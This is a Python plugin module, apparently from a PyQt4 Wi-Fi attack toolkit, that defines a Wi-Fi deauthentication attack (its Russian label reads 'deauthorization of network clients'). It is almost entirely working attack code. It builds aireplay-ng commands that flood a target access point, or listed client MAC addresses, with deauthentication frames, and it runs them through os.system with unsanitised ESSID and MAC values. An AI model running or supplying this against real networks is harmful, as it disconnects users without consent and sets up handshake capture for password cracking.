#!/usr/bin/env python
# -*- coding: utf-8 -*-
#

##############################################################################
from PyQt4 import QtCore
_fromUtf8 = QtCore.QString.fromUtf8
import logging
import os
import attack
##############################################################################


class DeAuth(attack.Attack):

    def do(self, **kw):
        logging.debug('Deauth attack begin')
        logging.debug('Attack: %s', str(kw))
        self.startDeauthAttack(**kw)
        logging.debug('Deauth attack end')

    def name(self):
        return _fromUtf8("Деавторизация клиентов сети")

    def startDeauthAttack(self, **kw):
        mac = kw['mac']
        iface = kw['ifaceMon']
        essid = kw.get('essid')
        clients = kw.get('clients')

        if essid is None:
            essid_s = ""
        else:
            essid_s = "-e %s" % essid

        if clients is None:
            cmds = [
                '/usr/local/sbin/aireplay-ng'
                ' -0 10 --ignore-negative-one -a %s %s %s' % (
                    mac,
                    essid_s,
                    iface
                )
            ]
        else:
            cmds = []
            for client in clients:
                cmds.append(
                    '/usr/local/sbin/aireplay-ng'
                    ' -0 10 --ignore-negative-one -c %s -a %s %s %s ' % (
                        client,
                        mac,
                        essid_s,
                        iface
                    )
                )

        for cmd in cmds:
            os.system(cmd)

Attack = DeAuth
